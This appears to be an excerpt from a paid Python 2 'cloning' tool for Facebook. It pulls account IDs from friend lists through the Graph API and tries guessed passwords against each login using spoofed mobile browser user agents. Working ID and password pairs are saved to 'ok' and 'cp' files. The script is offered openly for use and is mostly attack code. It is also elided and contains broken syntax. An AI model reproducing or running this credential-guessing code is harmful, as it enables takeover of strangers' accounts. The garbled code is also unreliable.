...
logo = """'
\x1b[1;93m'  _______ _     _   ____    _    _____ 
'\x1b[1;92m' \ \ / / _ \| | | / ___|  / \  |  ___|
'\x1b[1;91m'  \ V / | | | | | \___ \ / _ \ | |_   
'\x1b[1;93m'   | || |_| | |_| |___) / ___ \|  _|  
'\x1b[1;92m'   |_| \___/ \___/|____/_/   \_\_|    



'\x1b[1;91m'   Author      ||    YOUSAF KHAN  
'\x1b[1;92m'   Github      ||     YOUSAFXkhan 
'\x1b[1;93m'   FB ID       ||    YOUSAF Khan
'\x1b[1;94m'   TOOL TYPE   ||    PAID
'\x1b[1;96m'   WAP NUMBER  ||     +923181483064      
...
def main_apv():
    ...
    try:
        ...
        print ("           Contact To Admin For Youre Subscription")
        print ("")
        ...
        kok.close()
        print ("")
        print ("'\x1b[1;91m'           e oper wala apka key hay ")
        print ("'\x1b[1;93m'           copy karka whatsApp pay send kro ")
        print ("")
        print ("")
    ...
    r1=requests.get("https://raw.githubusercontent.com/YOUSAF-G/STYING/main/server.txt").text
    if key1 in r1:
        main_system()
    else:
        os.system("clear")
        ...
        print ("\x1b[1;94m'            Press Enter To Subscribe Your key ")
        print ("\x1b[1;94m'            And Contact Me On Whatsapp Thanks ")
        print ("")
        print ("         YOUR KEY : "+key1)
        print ("")
        print ("\x1b[1;94m'            This is Your key ")
        print ("\x1b[1;94m'            Copy Your Key  And Send To The Admin On Whatsapp")
        print ("")
        print ("")
        print ("")
...
def main_system():
    ...
    print ""
    print 39*'~'
    print "\033[1;93m1.\033[1;92m Public Cloning   \x1b[1;93m(Login)"
    print "33[1;9m2.\033[1;91m Random Cloning  \x1b[1;92m(No Login)"
    print "033[1;93m3.\033[1;93m File Making Menu\x1b[1;92m    (Login)"
    print "\033[1;93m4.\033[1;91m Check Subscription "
    print "\033[1;93m5.\033[1;92m Update Tools"
    print "\033[1;93m6.\033[1;93m For Any Help Massage WhatsApp"
    print 43*'~'
...
def main_input():
    ...
    if mx=='1':
        ...
        print ""
        print "\033[1;93m1.\033[1;92m With Choice Pass)"
        print "\033[1;93m2.\033[1;91mCloning With Name + Pass)"
        print "\033[1;93m3.\033[1;92m Cloning With Auto Pass"
        print "\033[1;93m0.\033[1;95mBack"
        print ""
        c=raw_input("[!] Select : ")
        if c=='1':
            f_p_pass()
        ...
        os.system("git clone https://github.com/YOUSAFG/STYING")
...
def numcloning():
    ...
    print ""
    os.system('echo " Mr___________________________YOUSAF"| lolcat')
...
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[YOUSAF-OK] "+coc+user + " | " + pass1
                ok=open('YOUSAF-ok.txt', 'a')
                ok.write(cid+ " | " +pass1+ "\n")
                ok.close()
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;92m[YOUSAF-OK] "+coc+user + " | " + pass1
                    cp=open('YOUSAF random-co.txt', 'a')
                    cp.write(cid+ " | " +pass1+ "\n")
                    cp.close()
    ...
    print "\033[1;93m BAAKI NAAM TO SONA HOGAA [YOUSAF])"
    print 40*'-'
    print ''
...
def fb_menu():
    ...
    print   ""
    print 39*'-'
    print "\033[1;91m1.\033[1;92m Public Cloning  [Pro]"
    print "\033[1;91m2.\033[1;92m Public Cloning  [Fast]"
    print "\033[1;91m0.\033[1;91m Back "
    print 39*'-'
    cz=raw_input('[!] Select : ')
    if cz=="1":
        print ""
...
def mineExt():
    ...
    print g+"[=] Extracting From YOUSAF : "+my_line[:15]
...
myagents=random.choice(['Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print "\x1b[1;92m[YOUSAF-OK] "+uid + " | " + pass2
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print "\x1b[1;92m[YOUSAF-OK] "+uid + " | " + pass3
                                ok=open('rsa-ok.txt', 'a')
                                ok.write(uid+ " | " +pass3+ "\n")
                                ok.close()
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[YOUSAF-CP] "+uid + " | " + pass3
                                    cp=open('rsa-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        print "\x1b[1;92m[YOUSAF-OK] "+uid + " | " + pass4
                                        ok=open('rsa-ok.txt', 'a')
                                        ok.write(uid+ " | " +pass4+ "\n")
                                        ok.close()
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            print "\x1b[1;91m[YOUSAF-CP] "+uid + " | " + pass4
                                            cp=open('rsa-cp.txt', 'a')
                                            cp.write(uid+ " | " +pass4+ "\n")
                                            cp.close()
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                print "\x1b[1;92m[YOUSAF-OK] "+uid + " | " + pass5
                                                ok=open('rsa-ok.txt', 'a')
                                                ok.write(uid+ " | " +pass5+ "\n")
                                                ok.close()
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;91m[YOUSAF-CP] "+uid + " | " + pass5
                                                    cp=open('rsa-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
    ...
    print "\033[1;93m NAAM TO SONA HOGAA [YOUSAF])"
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    fb_menu()
...
def xokp():
    ...
    count.append(my_line)
    print g+"[=] We are graping links for ok ids : "+my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line to:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck=open("jok.txt",'a')
    for i in z['data']:
        uid = i['id']
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            print "\x1b[1;91m[YOUSAF-CP] "+uid + " | " + pass2
                            cp=open('YOUSAF-cp.txt', 'a')
                            cp.write(uid+ " | " +pass2+ "\n")
                            cp.close()
                            cps.append(uid+pass2)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;91m[YOUSAF-OK] "+uid + " | " + pass3
                                    cp=open('YOUSAF-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
        ...
        try:
            ...
            if "access_token" in q:
                ...
                if "www.facebook.com" in q ["error_msg"]:
                    print "\x1b[1;91m[YOUSAF-OK] "+uid + " | " + pass1
                    cp=open('YOUSAF-cp.txt', 'a')
                    cp.write(uid+ " | " +pass1+ "\n")
                    cp.close()
                    cps.append(uid+pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'checkpoint' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                    print "\x1b[1;97m[YOUSAF-CP] "+uid + " | " + pass3
                                    cp=open('SUBHAN-cp.txt', 'a')
                                    cp.write(uid+ " | " +pass3+ "\n")
                                    cp.close()
                                    cps.append(uid+pass3)
                                    ...
                                    if 'c_user' in rana.cookies.get_dict().keys():
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    print "\x1b[1;92m[YOUSAF-CP] "+uid + " | " + pass5
                                                    cp=open('SUBHAN-cp.txt', 'a')
                                                    cp.write(uid+ " | " +pass5+ "\n")
                                                    cp.close()
                                                    cps.append(uid+pass5)
                                        ...
                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                            ...
                                            if 'c_user' in rana.cookies.get_dict().keys():
                                                ...
                                                if 'checkpoint' in rana.cookies.get_dict().keys():
                                                    ...
                                                    if 'c_user' in rana.cookies.get_dict().keys():
                                                        print "\x1b[1;92m[YOUSAF-OK] "+uid + " | " + pass6
                                                        ok=open('SUBHAN-ok.txt', 'a')
                                                        ok.write(uid+ " | " +pass6+ "\n")
                                                        ok.close()
                                                        ...
                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
                                                            print "\x1b[1;91m[YOUSAF-CP] "+uid + " | " + pass6
                                                            cp=open('SUBHAN-cp.txt', 'a')
                                                            cp.write(uid+ " | " +pass6+ "\n")
                                                            cp.close()
